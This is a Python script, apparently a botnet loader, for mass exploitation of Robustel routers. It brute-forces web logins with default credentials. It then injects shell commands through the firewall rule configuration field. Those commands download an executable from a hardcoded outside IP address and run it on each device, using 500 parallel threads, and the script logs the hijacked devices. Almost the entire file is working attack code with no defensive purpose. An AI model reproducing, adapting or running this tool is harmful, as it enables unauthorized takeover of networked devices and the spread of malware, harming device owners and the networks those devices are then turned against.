#!/usr/bin/env python3
"""
ROBUSTEL ADVANCED LOADER - Maximum Exploitation
Supports multiple credentials, extreme parallelization, and payload variants.
"""

import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
import sys
import logging
from urllib.parse import urljoin
import json
from typing import List, Tuple, Optional

# Suppress warnings
requests.packages.urllib3.disable_warnings()
logging.getLogger("urllib3").setLevel(logging.CRITICAL)
logging.getLogger("requests").setLevel(logging.CRITICAL)

# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {
    'timeout': 10,
    'max_workers': 500,
    'payload_server': '72.62.37.166',
    'payload_script': '1.sh',
    'creds_file': 'creds.txt',
    'ips_file': 'ips.txt',
    'output_file': 'exploited_robustel.txt',
}

# ============================================================================
# CREDENTIALS MANAGER
# ============================================================================

class CredentialsManager:
    """Manage multiple credential sets."""
    
    def __init__(self):
        self.credentials = [
            ('admin', 'admin'),
            ('root', 'root'),
            ('admin', 'password'),
            ('admin', '12345'),
            ('admin', '123456'),
            ('admin', 'admin123'),
            ('root', 'root123'),
            ('operator', 'operator'),
            ('user', 'user'),
            ('guest', 'guest'),
        ]
    
    def get_creds(self) -> List[Tuple[str, str]]:
        """Get all credentials to try."""
        return self.credentials

# ============================================================================
# PAYLOAD GENERATOR
# ============================================================================

class PayloadGenerator:
    """Generate multiple payload variants."""
    
    def __init__(self, server='72.62.37.166', script='1.sh'):
        self.server = server
        self.script = script
    
    def generate_payloads(self) -> List[str]:
        """Generate all payload variants."""
        base_cmd = f"wget http://{self.server}/{self.script} -O juli && chmod 777 juli && ./juli && rm juli"
        
        payloads = [
            # Basic injection
            f"iptables -A INPUT -s 1.1.1.1 -j ACCEPT`{base_cmd}`",
            f"iptables -A INPUT -s 1.1.1.1 -j ACCEPT$({base_cmd})",
            f"iptables -A INPUT -s 1.1.1.1 -j ACCEPT;{base_cmd};",
            f"iptables -A INPUT -s 1.1.1.1 -j ACCEPT&&{base_cmd}",
            
            # With pipes
            f"iptables -A INPUT -s 1.1.1.1 -j ACCEPT|{base_cmd}",
            
            # Alternative download methods
            f"iptables -A INPUT -s 1.1.1.1 -j ACCEPT`curl http://{self.server}/{self.script} -o juli && chmod 777 juli && ./juli`",
            
            # Multiple commands
            f"iptables -A INPUT -s 1.1.1.1 -j ACCEPT;wget http://{self.server}/{self.script} -O /tmp/juli;chmod 777 /tmp/juli;/tmp/juli",
            
            # Spaces and variants
            f"iptables -A INPUT -s 1.1.1.1 -j ACCEPT `wget -O- http://{self.server}/{self.script}|sh`",
            
            # Background execution
            f"iptables -A INPUT -s 1.1.1.1 -j ACCEPT&(wget http://{self.server}/{self.script} -O juli && chmod 777 juli && ./juli)&",
            
            # Newline injection
            f"iptables -A INPUT -s 1.1.1.1 -j ACCEPT\nwget http://{self.server}/{self.script} -O juli\nchmod 777 juli\n./juli",
        ]
        
        return payloads

# ============================================================================
# ROBUSTEL EXPLOITER
# ============================================================================

class RobustelExploiter:
    """Advanced Robustel exploitation."""
    
    def __init__(self):
        self.cred_manager = CredentialsManager()
        self.payload_gen = PayloadGenerator()
        self.exploited = []
        self.lock = __import__('threading').Lock()
        self.count = 0
    
    def normalize_url(self, target: str) -> str:
        """Normalize target URL."""
        if not target.startswith(('http://', 'https://')):
            # Try both http and https
            return f'http://{target}'
        return target.rstrip('/')
    
    def attempt_login(self, target: str, username: str, password: str) -> Optional[str]:
        """Attempt to login and get session cookie."""
        url = f"{target}/action/weblogin"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        data = {
            'username': username,
            'password': password,
            'language': 'english',
            'submit': 'LOGIN',
        }
        
        try:
            resp = requests.post(
                url,
                headers=headers,
                data=data,
                timeout=CONFIG['timeout'],
                verify=False,
                allow_redirects=False
            )
            
            if resp.status_code == 302:
                # Extract session cookie
                cookie_header = resp.headers.get('Set-Cookie', '')
                if '-goahead-session-=::webs.session::' in cookie_header:
                    cookie_value = cookie_header.split('-goahead-session-=::webs.session::')[1].split(';')[0].strip()
                    return cookie_value
        except:
            pass
        
        return None
    
    def send_exploit(self, target: str, cookie: str, payload: str) -> bool:
        """Send exploit payload."""
        # Step 1: Set config
        url_set = f"{target}/ajax/webs_uci_set/"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Cookie': f'-goahead-session-=::webs.session::{cookie}',
            'Content-Type': 'application/x-www-form-urlencoded',
        }
        
        data_set = {
            'setmsg': f'<config_xml><firewall><custom_list><id>1</id><desc>rule1</desc><rule>{payload}</rule></custom_list></firewall></config_xml>',
            'hash': f'::webs.session::{cookie}',
        }
        
        try:
            resp1 = requests.post(
                url_set,
                headers=headers,
                data=data_set,
                timeout=CONFIG['timeout'],
                verify=False
            )
            
            if not (resp1.ok and 'OK' in resp1.text):
                return False
        except:
            return False
        
        # Step 2: Apply config
        url_apply = f"{target}/ajax/save_apply/"
        
        data_apply = {
            'hash': f'::webs.session::{cookie}',
        }
        
        try:
            resp2 = requests.post(
                url_apply,
                headers=headers,
                data=data_apply,
                timeout=CONFIG['timeout'],
                verify=False
            )
            
            if 'OK' in resp2.text:
                return True
        except:
            pass
        
        return False
    
    def exploit_target(self, target: str) -> bool:
        """Exploit single target with all credential combinations."""
        target = self.normalize_url(target)
        
        credentials = self.cred_manager.get_creds()
        payloads = self.payload_gen.generate_payloads()
        
        # Try each credential
        for username, password in credentials:
            cookie = self.attempt_login(target, username, password)
            
            if not cookie:
                continue
            
            # Try each payload with this credential
            for payload in payloads:
                if self.send_exploit(target, cookie, payload):
                    with self.lock:
                        self.exploited.append(target)
                        self.count += 1
                    print(f"[+] EXPLOITED: {target} (creds: {username}:{password})")
                    
                    with open(CONFIG['output_file'], 'a') as f:
                        f.write(f"{target}\n")
                    
                    return True
        
        return False
    
    def run(self, targets: List[str]):
        """Run exploitation on all targets."""
        print(f"\n{'='*80}")
        print(f"ROBUSTEL ADVANCED LOADER - EXTREME EXPLOITATION")
        print(f"{'='*80}\n")
        print(f"[*] {len(targets)} targets")
        print(f"[*] {len(self.cred_manager.get_creds())} credential combinations")
        print(f"[*] {len(self.payload_gen.generate_payloads())} payload variants")
        print(f"[*] {CONFIG['max_workers']} workers\n")
        
        start = time.time()
        
        with ThreadPoolExecutor(max_workers=CONFIG['max_workers']) as executor:
            futures = [executor.submit(self.exploit_target, t) for t in targets]
            
            completed = 0
            for future in as_completed(futures):
                completed += 1
                try:
                    future.result()
                except:
                    pass
                
                if completed % 100 == 0:
                    elapsed = time.time() - start
                    rate = completed / elapsed if elapsed > 0 else 0
                    pct = (completed / len(targets)) * 100
                    print(f"[*] {pct:.0f}% | {completed}/{len(targets)} | Rate: {rate:.0f}/s | Exploited: {self.count}\n")
        
        elapsed = time.time() - start
        
        print(f"\n{'='*80}")
        print(f"[★] EXPLOITED {self.count} DEVICES!!!")
        print(f"Time: {elapsed:.1f}s")
        print(f"Rate: {len(targets)/elapsed:.0f} targets/s")
        print(f"{'='*80}\n")

# ============================================================================
# MAIN
# ============================================================================

def load_targets(filename: str) -> List[str]:
    """Load targets from file."""
    try:
        with open(filename, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        return targets
    except:
        print(f"[!] Error reading {filename}")
        return []

def main():
    """Main entry point."""
    # Load targets from both files
    targets = []
    
    targets.extend(load_targets('https.txt'))
    targets.extend(load_targets('ips.txt'))
    
    # Remove duplicates
    targets = list(set(targets))
    
    if not targets:
        print("[!] No targets loaded")
        return
    
    print(f"[*] Loaded {len(targets)} unique targets\n")
    
    exploiter = RobustelExploiter()
    exploiter.run(targets)

if __name__ == "__main__":
    main()
